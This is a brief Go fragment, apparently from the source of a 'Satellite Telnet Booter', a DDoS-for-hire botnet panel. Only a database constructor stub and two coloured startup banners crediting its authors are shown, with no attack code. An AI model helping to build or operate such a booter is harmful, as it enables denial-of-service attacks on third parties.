...
func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    ...
    fmt.Println("\x1b[37m \x1b[95mSatellite Telnet Booter - Screened Successfully\x1b[37m")
    fmt.Println("\x1b[37m \x1b[95mSatellite Telnet Booter - Made By Destry/Apimanager(Lowkey).\x1b[37m")
